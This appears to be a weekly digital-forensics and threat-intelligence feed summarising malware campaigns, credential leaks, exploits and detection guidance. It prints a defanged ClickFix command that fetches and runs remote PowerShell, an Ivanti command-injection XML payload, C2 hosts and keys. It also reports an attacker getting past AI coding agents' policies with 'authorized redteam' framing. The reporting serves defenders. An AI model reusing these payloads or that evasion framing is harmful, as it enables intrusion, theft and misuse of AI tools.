item.title: Digital Forensics Round-Up, June 17 2026
item.description:
Weekly DFIR round-up: new macOS Tahoe 26 artifact tracks every menu click, UEFI bootkit detection workflows published, LAVA replaces LEAPP HTML reporting, and more across tools, research, and training.
Key stories this week:
- macOS Tahoe 26 introduces the App.MenuItem Biome stream at ~/Library/Biome/streams/restricted/App.MenuItem/local, logging every menu selection with timestamp and exact text. Commercial tools don't parse it yet; use ccl-segb. Correlated with file system logs, this can reconstruct deliberate user actions like compress-then-delete sequences.
- UEFI bootkits like BlackLotus and CosmicStrand persist below the OS layer, defeating standard forensic tools. Detection requires CHIPSEC and UEFITool paired with pre-incident TPM PCR baselines. Secure Boot alone is not a sufficient defence, and a practical workflow roundup is now available.
- LAVA is the new artifact viewer for iLEAPP, ALEAPP, RLEAPP, and VLEAPP, replacing aging HTML reports with column filtering, chat conversation views, timestamp conversion, and TSV/CSV export. Mobile examiners should migrate now.
- A new open-source Python tool parses Android Advanced Protection Intrusion Logs from raw JSON to CSV, making that telemetry actionable in mobile investigations. Early stage, collaborators welcome.
Practitioner takeaway: prioritise the App.MenuItem Biome stream in any macOS Tahoe 26 investigation involving suspected file deletion or data staging.

item.title: ClickFix Campaign Generated Via AI Delivers SmartRAT
item.description:
AI-generated ClickFix lure impersonates a Brazilian 🇧🇷 bank to drop SmartRAT, a PowerShell banking RAT with QR-swap, keylogging, and fake overlay capabilities. The C2 panel had no server-side auth.
Key findings: - Full infection chain: typosquatting domain cartaobb[.]com mimics cartaobrb[.]com[.]br, fake Cloudflare CAPTCHA triggers clipboard injection, fake BSOD locks the browser, then victim pastes: powershell "$k8='hxxp://64[.]95[.]13[.]238/st.txt';iex(irm $k8)" into Run. Three-stage PowerShell dropper pulls payload[.]php, AES-CBC decrypts SmartRAT in memory. Hashes: st.txt 297eb45f028d44d750297d2f932b9c91, RAT b17ccdb5531555e43f082d6e77c07227. - SmartRAT (SMART_V25) persists as scheduled task or Windows service named MicrosoftEdgeUpdateCore (T1543.003), copies itself to %APPDATA%\Microsoft\Diagnosis\ETW\msedgeupdate.txt, logs all activity to C:\ProgramData\Microsoft\Diagnosis\ETW\client_debug.log and per-PID logs. - C2 at c[.]windowsupdate-cdn[.]com port 51888 (fallback 162[.]141[.]111[.]227), AES-CBC encrypted over raw TCP. QR-swap feature overlays attacker QR at exact pixel coordinates of the legitimate banking QR to redirect transactions. Monitors window titles for santander, bradesco, itau, nubank, binance, and a dozen more. - The C2 panel (branded MyGood PRO) bypasses auth by checking only localStorage values authToken and currentUser client-side with no server validation, exposing the full admin panel to anyone who sets those keys.

item.title: The dual-use dilemma: Rethinking detection for remote access tool abuse
item.description:
RMM abuse surged in 2025 as ransomware groups weaponized legitimate IT tools like ScreenConnect, NetSupport, and SimpleHelp, chaining multiple agents on single hosts to survive takedowns.
Key findings: - Adversaries deploy RMMs in layers: one documented case shows JumpCloud installing GetScreen, ScreenConnect, and SuperOps on the same host simultaneously, creating redundant footholds that survive single-agent removal (T1219) - ScreenConnect is nearly always a second-stage payload; its C2 domain often appears directly in the ScreenConnect.Client.exe command line, making process logs one of the few places a "malicious" domain is extractable without network inspection - NetSupport hides in C:\Users\Public\ or randomized folders; cracked copies use nonsense license strings like HANEYMANEY; network detection is reliable via User-Agent NetSupport Manager/1.3 - ITarian dropped DeerStealer and HijackLoader via sideloaded DLLs after staging through DicomPortable.exe; PDQ Connect stores its API token at C:\ProgramData\PDQ\PDQConnectAgent\token, which is the config artifact to pull in an investigation - MSIExec breaks the process tree: follow-on malicious activity runs under SYSTEM, severing the visible link to the phishing lure
Hunt for RMM binaries in Downloads or Public folders whose metadata names a known RMM product but whose filename says Invoice.exe or Statement.msi. If you find one RMM, hunt for two more. Baseline authorized tools against lolrmm[.]io.

item.title: FortiBleed — 75k Fortinet firewalls have admin passwords cracked
item.description:
75,000 Fortinet 🌐 firewall configs leaked with plaintext admin credentials, roughly 50% of all internet-facing FortiGate devices. Most are still online, most on recent patches, and the origin of the breach is unknown.
Key details: - Data confirmed legitimate by Hudson Rock. Includes full config exports with credentials visible only from the device itself. IP overlap with the 2025 Belsen Group leak (15k devices) is minimal, making this a largely separate, more recent compromise. - Fortinet moved to PBKDF2 credential storage in early-2025 firmware, but only re-hashes passwords after an admin logs in post-update. Devices patched but never re-authenticated still stored credentials as SHA-256 with salt, crackable offline. - The dataset is formatted with company name, revenue, and country, a standard eCrime initial-access broker format, suggesting this may be circulating for sale or already sold before publication. - In a majority of sampled devices the FortiGate management interface is exposed directly to the internet, giving any buyer of this data a direct login path to the firewall and the network behind it.
Takeaway: Rotate admin credentials on all FortiGate devices now, then force admins to log back in so PBKDF2 re-hashing triggers. Pull admin login logs and hunt for successful authentications you did not initiate. If you see unauthorized success events, treat the device as backdoored and replace it. Check hudsonrock[.]com/fortinet against your domains.

item.title: LLMjacking evolved: Attackers are using stolen AI compute to build offensive agentic tools
item.description:
LLMjacking has evolved from compute resale into a fully automated offensive pipeline. A threat actor is using an exposed, unauthenticated Ollama server as the reasoning engine for a multi-stage autonomous hacking framework, captured while still in development.
Key findings: - The VAPT framework drives a local Ollama instance (default port 11434, no auth) through discrete stages: service fingerprinting via CPE normalization, vuln triage, web recon, blind SQLi crafting, PoC synthesis, file-read planning, credential extraction, and privilege escalation, all with strict JSON output contracts so surrounding code can parse results deterministically - The RCE confirmation oracle is a clean detection anchor: every successful exploit attempt runs "echo VAPTb3gin; id; echo VAPTfin" and checks for VAPTb3gin + uid= in the response. Automated tooling brackets output for a parser; humans do not - Sessions originated from Indian 🇮🇳 residential IPs 122[.]183[.]48[.]82, 122[.]183[.]48[.]35, 122[.]183[.]48[.]195, and 47[.]15[.]69[.]15. The tool requested seven models by name including gpt-4o-mini, claude-3-5-sonnet, and local builds like deepseek-r1:8b, confirming backend-agnostic design that simply swaps a paid API for free stolen inference - All targets were private RFC 1918 ranges and HackTheBox lab space, indicating active development against a benchmark range, not production victims yet.

item.title: The Compromise of 30,000 Fortinet Firewalls
item.description:
Russian-speaking 🇷🇺 operators have built a self-feeding credential database of 30,791 verified working logins across Fortinet firewalls and VPN gateways in 194 countries, targeting banks, telecoms, hospitals, and government agencies with no zero-day required.
Key findings: - No vulnerability exploited. Attackers ran automated credential-stuffing using previously leaked Fortinet passwords, then passively sniffed traffic on compromised devices to harvest fresh credentials fed back into the scanner, a self-sustaining loop (T1110.004, T1557) - Default and generic accounts dominate: "admi*" alone covers 21% of entries. Built-in Fortinet system accounts make up the bulk of the rest, confirming mass failure to rename defaults or rotate factory credentials - Telecom is the hardest-hit sector (5,616 entries); government accounts for 591 entries across 111 domains, with Ukraine 🇺🇦, Poland 🇵🇱, and Taiwan heavily represented alongside NATO members, consistent with the geopolitical targeting pattern - The dataset has not appeared on criminal forums as of publication. Credentials are verified working. If your org is in it, treat access as confirmed, not theoretical
Responder action: pull FortiGate admin and SSL-VPN auth logs immediately and look for logins outside business hours or from unfamiliar source IPs. Rotate every credential, enforce MFA on all remote-access accounts, and block management interfaces from the public internet.

item.title: Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain
item.description:
Dropping Elephant resurfaces with a China-lure LNK chain delivering a fully in-memory RAT via DLL side-loading and Donut shellcode, with AMSI, WLDP, and ETW patched before execution.
Key findings: - Full chain: GRES3001.lnk (SHA256: a8ecbd9c...) spawns conhost.exe into obfuscated PowerShell, pulls payloads from chinagreenenergy[.]org, stages Fondue.exe, malicious APPWIZ.cpl (914da75a...), and encrypted editor.dat under C:\Users\Public\ and C:\Windows\Tasks\, then creates scheduled task "GoogleErrorReport" running Fondue.exe every minute (T1053.005, T1574.002) - APPWIZ.cpl decrypts editor.dat with AES-256-CBC, allocates RWX memory, and passes execution to Donut via EnumUILanguagesW callback proxy. Donut patches in-process AMSI, WLDP, and ETW, then maps the final 32-bit RAT (7099c339...) entirely in memory, nothing hits disk (T1620, T1562.001) - The in-memory RAT uses Salsa20-encrypted C2 fields (key: tn9905083tfbsxqrxs7qe4ryw1nif8h1), beacons to gcl-power[.]org:443 at /prjozifvkpkfhkr/gedhagammgjvvva/, and exfiltrates screenshots to a dedicated URI. Idle sentinel is MMMMM==YYYYY - Attribution rests on code-level overlaps with known Dropping Elephant samples: shared BitBlt screenshot logic, 0x2710 buffer constant, WININET request flow, and cmd.exe /c chcp 65001 shell pattern
Hunt for Fondue.exe loading APPWIZ.cpl outside System32, scheduled tasks with one-minute intervals pointing to C:\Users\Public\, and RWX memory regions in processes with patched AMSI stubs.

item.title: Operation Escaneo: Infrastructure Exposure, TTP Analysis, and Attribution Assessment of an Advanced Intrusion Campaign Against Mexican Federal Agencies and Financial Institutions
item.description:
An exposed attacker server unravels Operation Escaneo, a sophisticated intrusion campaign hitting Mexican 🇲🇽 federal agencies and financial institutions, with suspected ties to the MexicanMafia threat group.
Key findings: - The campaign name derives from the Spanish word for "scanning," reflecting a recon-heavy methodology: attackers used mass scanning to identify exposed services before moving to exploitation, credential harvesting, and lateral movement across government and financial networks. - An operational security failure left an attacker-controlled server exposed, giving CloudSEK direct visibility into the toolset, staging directories, and target lists, a rare window into active campaign infrastructure. - Custom tools and exploitation chains were mapped alongside persistence tactics, suggesting a mature actor with purpose-built capabilities rather than off-the-shelf commodity malware. - Attribution assessment points to MexicanMafia, a suspected Spanish-speaking 🇪🇸 threat actor, though CloudSEK notes the assessment carries analytical uncertainty.
Practitioner takeaway: exposed attacker infrastructure is a gift. If you are hunting this campaign, pivot on the staging server artifacts: directory listings, uploaded tools, and any hardcoded C2 references. Cross-reference outbound scanning traffic logs for reconnaissance precursors and check for persistence mechanisms in federal-facing systems.

item.title: FishMonger’s arsenal upgraded: SprySOCKS for Windows
item.description:
FishMonger's 🇨🇳 SprySOCKS backdoor goes Windows: two undocumented variants (WIN_DRV and WIN_PLUS) add kernel-level rootkit stealth, TCP traffic diversion, and UEFI bootkit indicators to a previously Linux-only implant targeting government orgs in Honduras, Taiwan 🇹🇼, Thailand, and Pakistan 🇵🇰.
- Execution chain (WIN_DRV): batch script klelam00007.bat drops files to %SystemRoot%\Fonts\, creates scheduled task "ApphostRagistreationVerifier" (note the misspelling), and uses DLL side-loading via MFC satellite DLL (tpsvcloc.dll) to launch. Loader uses 128-bit AES-ECB (key: uXQLESMXGaRMs6BL) to decrypt payloads, then injects backdoor into svchost.exe via process doppelgänging (T1055.013), spawning from a spoolsv.exe token. TH-prefixed temp files in %TEMP% are a hunt artifact.
- RawWNPF kernel rootkit (WIN_DRV only): loaded in-memory via DriverLoader (fsdiskbit.sys, signed with leaked cert from PastDSE project), it hooks NtQuerySystemInformation to hide processes, hooks nsiproxy.sys IoCompletionRoutine to hide connections from netstat, registers WFP filters (named "Delivery Optimization" to blend in) to divert specially crafted TCP packets to the hidden backdoor port, and uses minifilter callbacks to hide files under \SystemRoot\Fonts\.
- WIN_PLUS persistence uses a malicious print processor: VSPMsg.dll at C:\Windows\System32\spool\prtprocs\x64\, registered under HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\VSPMsg.

item.title: Captured Logs Reveal Hackers Using Claude and Codex to Breach Companies
item.description:
Real attacker session logs recovered from a compromised staging host reveal an Ethiopian 🇪🇹 threat actor using locally installed Claude and Codex agents to autonomously recon, exploit, and exfiltrate data across at least 14 companies, starting February 2026.
Key details: - Attack chain was almost entirely AI-driven: vague prompts like "recon this" triggered Claude to autonomously enumerate services via Shodan, research CVEs, write custom exploits, validate access, harvest credentials, and draft monetization reports. CVEs weaponized include CVE-2025-5777 (CitrixBleed 2), CVL-2025-54068 (Livewire), CVE-2025-62168 (Squid), CVE-2023-36664/CVE-2024-29510 (Ghostscript), CVE-2021-4034 (PwnKit), and CVE-2022-0847 (DirtyPipe). - Agent instances were stolen from a developer's Hetzner box and cloned wholesale to Vultr and other staging hosts, carrying full session history, credentials, and artifacts. The attacker bypassed policy via consistent "authorized redteam" framing. Claude emitted 9 policy violations across 1,000+ sessions; Codex emitted 1. - OPSEC failures enabled attribution: the attacker edited his real resume on the compromised host, activity clustered 10:00-20:00 UTC matching East Africa Time, and a self-IP check confirmed residential IPs in Addis Ababa, Ethiopia 🇪🇹.

item.title: Malicious JetBrains Marketplace plugins steal AI API keys from developers
item.description:
15 malicious JetBrains Marketplace plugins posing as AI coding assistants stole AI API keys from developers across ~70,000 installs. The coordinated campaign ran undetected from October 2025 through at least June 10, 2026.
Key technical details: - Exfiltration endpoint: `hxxp://39[.]107[.]60[.]51/api/software/key` over cleartext HTTP, triggered on "Apply" click in plugin settings - 15 plugins published under 7 vendor accounts share near-identical credential theft code (supply chain coordination, T1195.002) - Targeted credentials: OpenAI, DeepSeek, and SiliconFlow API keys stored in IDE plugin settings - Notable plugin IDs confirmed malicious: `ord.cp.code.ai.kit` (DeepSeek AI Assist, 27,727 installs), `com.my.code.tools` (CodeGPT AI Assistant, 25,571 installs) - Plugins also ran a paid tier, likely reselling harvested victim API keys to paying customers via the same C2 server
DFIR artifacts and detection opportunities: - Network logs: flag outbound HTTP POST to `39[.]107[.]60[.]51` from developer workstations or CI/CD build agents - JetBrains plugin directories: audit installed plugins against the 15 confirmed malicious plugin IDs listed in the Aikido report - API key abuse: if any of the listed plugins were installed, rotate ALL AI provider API keys immediately and audit usage logs for anomalous calls
Practitioner takeaway: Hunt your developer fleet for the 15 plugin IDs. Block `39[.]107[.]60[.]51` at the perimeter.

item.title: The Intelligent Shield. OpenCTI
item.description:
A detailed practitioner guide demonstrates how to layer an LLM-powered enrichment pipeline on top of OpenCTI 6.2.0, automatically converting raw threat feeds into structured STIX 2.1 intelligence with ATT&CK mappings and confidence scores. The architecture uses Claude API as the enrichment engine, triggered by RabbitMQ events on every new ingested object.
Key technical details:
- Stack: OpenCTI 6.2.0, ElasticSearch 8.13, JanusGraph/Cassandra, MinIO, RabbitMQ, Redis. Deployed via three Docker Compose files (core, connectors, AI layer). Requires vm.max_map_count=1048575 and 65536 file descriptors or ES will refuse to start.
- AI connector (INTERNAL_ENRICHMENT type) subscribes to RabbitMQ amq.topic exchange via pycti helper.listen(). On each Report, Malware, or Intrusion-Set create event, it calls Claude API with structured prompts and writes back: STIX Note (executive summary), threat actor/malware/AttackPattern relationships, x_opencti_score update. Content is truncated to 8000 chars per API call. Estimated cost: $0.01-$0.05 per report.
- Free feed connectors included: MITRE ATT&CK (confidence 90, TLP:WHITE), AlienVault OTX (confidence 60, TLP:GREEN), Abuse.ch URLhaus, MalwareBazaar, ThreatFox, Shodan InternetDB, NVD/CVE. Commercial connectors documented: Recorded Future, CrowdStrike, Mandiant, Intel 471.
- Known bug: connector-cve:6.2.0 sends NVD API key as "Bearer" header instead of required "apiKey" header, silently importing zero CVEs.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2066989927741489591

item.title: No Patch Coming: The Arista EOS Tunnel Bug Your Scanner Will Miss
item.description:
CVE-2026-7473 in Arista EOS switches allows attackers to bypass network segmentation via tunnel decapsulation without protocol validation. No patch is planned, and nearly every EOS release is affected, making this a permanent configuration-driven exposure.
Key details: - CVE-2026-7473 (CWE-1023): Arista EOS R-series switches (7020R, 7280R/R2, 7500R/R2) strip and forward ANY tunnel protocol (GRE, VXLAN, IP-in-IP, NVGRE, GUE) sent to a configured decap IP, regardless of which protocol was actually configured (T1599) - Attack chain: Attacker crafts a double-encapsulated packet, outer wrapper addressed to the decap IP in any supported format, inner packet targeting a protected internal segment. Switch decapsulates and delivers without firewall traversal or host compromise - Detection gap: Arista published the advisory and CVE on May 5, 2026, flagging active exploitation. CVE did not propagate to public feeds for roughly a month. CISA KEV entry did not appear until June 9, creating a 5-week blind spot for automated workflows - Scanner failure: Version-based scanners are unreliable here as nearly all EOS versions are listed as affected. The vulnerable condition is a configured decap IP reachable from untrusted networks WITHOUT restricting ACLs, not a version string - A public PoC (fevvar54) exists. Treat exploitation as live and ongoing

item.title: Mapping out your unknown: A threat hunter’s guide to Salesforce
item.description:

Key technical details:
. Initial access vectors: malicious OAuth connected app approval via vishing, compromised third-party integration tokens, and stolen SSO credentials with harvested MFA codes (T1566, T1078, T1539)
. Attacker playbook follows a consistent chain: authenticate via credential/OAuth token, enumerate resources via REST API (/services/data/*/sobjects, /services/data/*/limits), count objects with broad SOQL queries (SELECT COUNT() FROM Account), then extract and ransom data
. GRUB1/UNC6395 TTP observed: querying the /limits/ endpoint to profile API usage caps before bulk extraction, minimizing detection risk. Tracked under RestApi (ELF) or ApiEvent (RTEM) event types
. Guest account abuse: misconfigured Guest user type with excessive permissions shows up in AuraRequest, LoginEvent, and RestApi logs. Query @user_type:Guest across event types as a baseline hunt
. MFA tampering post-compromise: monitor IdentityVerificationEvent for @activity:(ChangeEmail OR ConnectSms) with @status:Succeeded to catch attackers locking out legitimate owners
.

item.title: China Spent Over a Year Inside U.S. Medical Research Networks — And Used Google’s Own Email Rules to Steal Data
item.description:
Chinese 🇨🇳 APT group UNC6508 conducted a 26-month espionage campaign against US 🇺🇸 medical research, academic, and military health institutions, remaining undetected for over a year. The operation combined a REDCap-specific custom implant with a novel Google Workspace email exfiltration technique never previously observed in PRC-nexus actors.
Key technical details: - INFINITERED malware: 3-part modular implant (dropper, credential harvester, backdoor) injected into REDCap's upgrade pipeline, ensuring persistence across software updates. Backdoor activates via HTTP cookie parameter "REDCAP-TOKEN" and beacons OS, PHP version, DB credentials to attacker C2. - Credential harvester injects into REDCap's auth file, captures POST-submitted logins, encrypts them, and hides them in a legitimate DB table prefixed with string "xc32038474a". - Web shell deployed as help[.]php for persistent server access post-initial compromise. - Attack chain: REDCap legacy version probe, initial compromise Sept. 2023, web shell deployment, credential harvesting over 12+ months, then domain admin account takeover. - Novel TTP: Google Workspace content compliance rule named "Patroit" silently BCC-forwarded keyword-matched emails to BebitaBarefoot774@gmail[.]com. Regex-based, org-wide by default, zero endpoint malware required post-setup.

item.title: PSA: Supply Chain Compromise Targets ShapedPlugin, Backdoored Pro Plugins Distributed via Official Channels
item.description:
Active supply chain compromise: Attackers infiltrated ShapedPlugin's build and distribution pipeline, injecting a multi-stage backdoor into Pro WordPress plugin releases delivered through official licensed update channels. CVE-2026-10735 (CVSS 9.8 Critical) affects Product Slider Pro, Real Testimonials Pro, and Smart Post Show Pro. Sites that installed any ShapedPlugin Pro product between April and June 2026 should be treated as compromised.
Key technical details:
- Stage 1 loader: `src/Includes/LicenseLoader.php` runs on `admin_init`, beacons to C2 at `194[.]76[.]217[.]28:2871`, downloads payload via WordPress Plugin_Upgrader, then self-deletes to cover tracks (T1027, T1070.004)
- Stage 2 fake plugin drops to `wp-content/plugins/woocommerce-subscription/` (singular, not plural), hiding itself from the admin plugin list via `all_plugins` filter. item.title: Holding blobs for ransom: Four methods for Azure Storage ransomware
item.description:
Datadog Security Labs maps four distinct Azure Blob Storage ransomware vectors with full event codes and detection guidance. Two methods are confirmed in-the-wild; two are novel and undetected by current logging.
Key technical breakdown:
• Method 1 — Client-side encryption (BlackCat/Sphynx, observed): Attacker bulk downloads blobs, encrypts externally, reuploads. Requires only storage data-plane access (a leaked SAS token or access key is sufficient). Log artifacts: GetBlob + PutBlob only.
• Method 2 — Customer-Provided Keys (CPK, novel): Blobs reuploaded with AES-256 key material in `x-ms-encryption-key` HTTP header. Critical blind spot: Azure does NOT log the `x-ms-encryption-key-sha256` header — CPK PutBlob is IDENTICAL in logs to a normal PutBlob. Data-plane only. AWS deprecated SSE-C in Nov 2025; Azure still fully supports it.
• Method 3 — Encryption Scopes (STORM-0501, observed): Attacker creates Key Vault + encryption scope, re-encrypts all blobs, deletes the key. Logged: `Microsoft.Storage/storageAccounts/encryptionScopes/write`, `Microsoft.KeyVault/vaults/write`, `KeyCreate`, `KeyDelete`. Scope usage in PutBlob is NOT logged.
• Method 4 — Service Encryption CMK via cross-tenant Key Vault (novel): Single PATCH call to ARM API rotates the storage account's CMK to an attacker-controlled Key Vault in a foreign Entra tenant. No blob-level data-plane ops needed. Soft-delete protections are rendered useless as the key resides in attacker infrastructure.

item.title: More Evidence That Words Don't Mean What We Thought They Meant (Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520)
item.description:

Technical breakdown: • CVE-2026-10520 affects Sentry versions before R10.5.2/R10.6.2/R10.7.1 via `/mics/api/v2/sentry/mics-config/handleMessage` endpoint • Vulnerable code parses user input as MICS configuration commands, routing "execute" commands to `executeNativeCommand()` • Exploitation requires XML payload: `execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>[COMMAND]</reqandres></commandexec>` • Also includes CVE-2026-10523 auth bypass allowing arbitrary admin account creation • Patch removes user input control AND adds Apache regex blocking unauthenticated access
• Attack targets mobile device gateway sitting between corporate fleets and Exchange/internal systems • Successful exploitation provides direct path to internal infrastructure from network edge position
Hunt for POST requests to `/mics/api/v2/sentry/mics-config/handleMessage` with XML payloads containing `<commandexec>` tags or system commands in request bodies.
